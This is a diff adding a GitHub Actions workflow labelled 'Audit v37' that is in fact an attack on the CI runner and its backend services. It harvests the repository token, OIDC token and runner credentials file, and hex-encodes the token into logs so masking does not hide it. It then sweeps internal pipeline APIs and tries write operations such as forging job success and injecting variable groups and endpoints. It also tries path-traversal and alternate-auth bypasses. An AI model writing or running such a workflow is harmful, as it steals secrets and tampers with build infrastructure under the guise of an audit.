@@ -1,0 +1,360 @@
+name: Audit v37
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v37:
+    runs-on: ubuntu-latest
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V37 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            TL=$(grep -oP '"timelineId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB TL=$TL"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt; echo "$TL" > /tmp/tl.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: IDTOK FULL API EXPLOITATION
+      # v36: IDTOK gets 200 on pools! RT/CTOK get 401
+      # Now try EVERY api with IDTOK — reads AND writes
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - IDTOK full API
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== IDTOK FULL API ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          PLAN=$(cat /tmp/plan.txt)
+          JOB=$(cat /tmp/job.txt)
+          TL=$(cat /tmp/tl.txt 2>/dev/null)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          RUNID="${{ github.run_id }}"
+
+          # A: Full GET surface
+          echo "--- A: IDTOK GET ---"
+          for EP in \
+            "/_apis/distributedtask/pools" \
+            "/_apis/distributedtask/pools/1" \
+            "/_apis/distributedtask/pools/1/agents" \
+            "/_apis/distributedtask/pools/1/agents/1" \
+            "/_apis/distributedtask/agentpools" \
+            "/_apis/distributedtask/variablegroups" \
+            "/_apis/distributedtask/environments" \
+            "/_apis/distributedtask/serviceendpoints" \
+            "/_apis/distributedtask/packages" \
+            "/_apis/distributedtask/plans/$PLAN" \
+            "/_apis/distributedtask/plans/$PLAN/timelines" \
+            "/_apis/distributedtask/plans/$PLAN/timelines/$TL" \
+            "/_apis/distributedtask/plans/$PLAN/timelines/$TL/records" \
+            "/_apis/distributedtask/plans/$PLAN/logs" \
+            "/_apis/distributedtask/plans/$PLAN/events" \
+            "/_apis/build/builds" \
+            "/_apis/build/builds/$RUNID" \
+            "/_apis/build/definitions" \
+            "/_apis/pipelines" \
+            "/_apis/pipelines/$RUNID" \
+            "/_apis/runtime/pipelines" \
+            "/_apis/runtime/pipelines/$RUNID" \
+            "/_apis/runtime/pipelines/$RUNID/runs" \
+            "/_apis/actions/runs" \
+            "/_apis/actions/runs/$RUNID" \
+            "/_apis/Container/containers" \
+            "/_apis/Container/containers/1" \
+            "/_apis/PipelinesChecks/runs/$RUNID/evaluations" \
+            "/_apis/serviceendpoint/endpoints" \
+            "/_apis/oauth2/token"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "$BASE$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "A $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          # B: WRITE operations with IDTOK
+          echo "--- B: IDTOK WRITES ---"
+
+          # Create variable group
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            "$BASE/_apis/distributedtask/variablegroups" \
+            -d '{"name":"v37-test","type":"Vsts","variables":{"key":{"value":"v37-injected","isSecret":false}}}')
+          CODE=$(echo "$R" | tail -1)
+          echo "B create vargroup = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+          # Create service endpoint
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            "$BASE/_apis/serviceendpoint/endpoints" \
+            -d '{"name":"v37-endpoint","type":"generic","url":"https://v37.test","authorization":{"scheme":"UsernamePassword","parameters":{"username":"v37","password":"test"}}}')
+          CODE=$(echo "$R" | tail -1)
+          echo "B create endpoint = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+          # Update timeline record (inject step output)
+          if [ -n "$TL" ]; then
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
+              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+              "$BASE/_apis/distributedtask/plans/$PLAN/timelines/$TL/records" \
+              -d "[{\"id\":\"$JOB\",\"state\":\"completed\",\"result\":\"succeeded\",\"name\":\"V37-INJECTED\"}]")
+            CODE=$(echo "$R" | tail -1)
+            echo "B patch timeline = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          fi
+
+          # Create pipeline artifact
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            "$BASE/_apis/runtime/pipelines/$RUNID/artifacts?api-version=6.0-preview" \
+            -d '{"name":"v37-artifact","type":"actions_storage"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "B create artifact = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+          # Post to plan logs
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            "$BASE/_apis/distributedtask/plans/$PLAN/logs" \
+            -d '{"path":"v37-injected-log"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "B create log = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+          # Post event
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            "$BASE/_apis/distributedtask/plans/$PLAN/events" \
+            -d '{"name":"JobCompleted","data":{"result":"succeeded"}}')
+          CODE=$(echo "$R" | tail -1)
+          echo "B post event = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: CTOK alternate auth schemes
+      # v36: CTOK as Bearer = PublicAccess. Try other schemes.
+      # Also: CTOK is a JWT — decode and check its claims
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - CTOK auth schemes
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== CTOK AUTH SCHEMES ==="
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          RUNNER="https://runner.actions.githubusercontent.com/$SECRET"
+          [ -z "$CTOK" ] || [ ${#CTOK} -lt 10 ] && { echo "NO CTOK"; exit 0; }
+
+          # A: Decode CTOK JWT claims
+          echo "--- A: CTOK claims ---"
+          python3 -c "
+          import json,base64,sys
+          t=open('/tmp/cred_token.txt').read().strip().split('.')
+          for i,part in enumerate(t[:2]):
+            p=part+'='*(4-len(part)%4)
+            try:
+              c=json.loads(base64.urlsafe_b64decode(p))
+              print(f'PART {i}:')
+              for k,v in c.items():
+                print(f'  {k}={v}')
+            except: pass
+          " 2>/dev/null
+          echo ""
+
+          # B: Try different auth headers on pipeline
+          echo "--- B: Pipeline auth schemes ---"
+          for SCHEME in "Bearer" "token" "Basic" "Negotiate" "NTLM"; do
+            if [ "$SCHEME" = "Basic" ]; then
+              AUTH_VAL=$(echo -n ":$CTOK" | base64)
+              HDR="$SCHEME $AUTH_VAL"
+            else
+              HDR="$SCHEME $CTOK"
+            fi
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: $HDR" "$BASE/_apis/distributedtask/pools")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B $SCHEME = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          # C: Try on runner service
+          echo "--- C: Runner auth schemes ---"
+          for SCHEME in "Bearer" "token" "Basic"; do
+            if [ "$SCHEME" = "Basic" ]; then
+              AUTH_VAL=$(echo -n ":$CTOK" | base64)
+              HDR="$SCHEME $AUTH_VAL"
+            else
+              HDR="$SCHEME $CTOK"
+            fi
+            for EP in \
+              "/_apis/connectionData" \
+              "/_apis/runner/registration" \
+              "/_apis/runner/runners" \
+              "/_apis/distributedtask/pools"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: $HDR" "$RUNNER$EP")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "C $SCHEME $EP = $CODE | $(echo "$BODY" | head -c 200)"
+            done
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: Traversal auth bypass patterns
+      # If IDTOK can read pools, can we traverse from IDTOK-auth
+      # paths to reach endpoints that normally need different auth?
+      # Also: use parent traversal with IDTOK for broader access
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Traversal auth bypass
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== TRAVERSAL AUTH BYPASS ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
+          PLAN=$(cat /tmp/plan.txt)
+
+          # A: IDTOK on parent scope (got 404 with RT before)
+          echo "--- A: IDTOK on parent ---"
+          for EP in \
+            "/_apis/distributedtask/pools" \
+            "/_apis/distributedtask/agents" \
+            "/_apis/distributedtask/variablegroups" \
+            "/_apis/distributedtask/environments" \
+            "/_apis/distributedtask/serviceendpoints" \
+            "/_apis/build/builds" \
+            "/_apis/pipelines" \
+            "/_apis/runtime/pipelines" \
+            "/_apis/actions/runs" \
+            "/_apis/oauth2/token" \
+            "/_apis/Container/containers"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "$BASE/$SECRET/..$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "A IDTOK parent $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          # B: IDTOK on runner service (v36 was cut off)
+          echo "--- B: IDTOK on runner ---"
+          RUNNER="https://runner.actions.githubusercontent.com/$SECRET"
+          for EP in \
+            "/_apis/connectionData" \
+            "/_apis/resourceareas" \
+            "/_apis/distributedtask/pools" \
+            "/_apis/runner/registration" \
+            "/_apis/runner/runners" \
+            "/_apis/runner/runners/me" \
+            "/_apis/runner/groups" \
+            "/_apis/runner/status" \
+            "/_apis/actions" \
+            "/_apis/actions/runner-registration"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "$RUNNER$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "B $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          # C: IDTOK on runner PARENT
+          echo "--- C: IDTOK runner parent ---"
+          for EP in \
+            "/_apis/connectionData" \
+            "/_apis/distributedtask/pools" \
+            "/_apis/runner/runners" \
+            "/_apis/oauth2/token"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "$RUNNER/../$EP" --path-as-is)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_000" ] && \
+              echo "C $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          # D: IDTOK on vstoken (since IDTOK has pipeline perms, maybe vstoken too?)
+          echo "--- D: IDTOK on vstoken ---"
+          VSBASE="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"
+          for EP in \
+            "/_apis/connectionData" \
+            "/_apis/resourceareas" \
+            "/_apis/TokenIssue" \
+            "/_apis/TokenAuth" \
+            "/_apis/oauth2/token" \
+            "/_apis/Oidc/.well-known/openid-configuration"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "$VSBASE$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "D $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V37 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V37 COMPLETE ==="
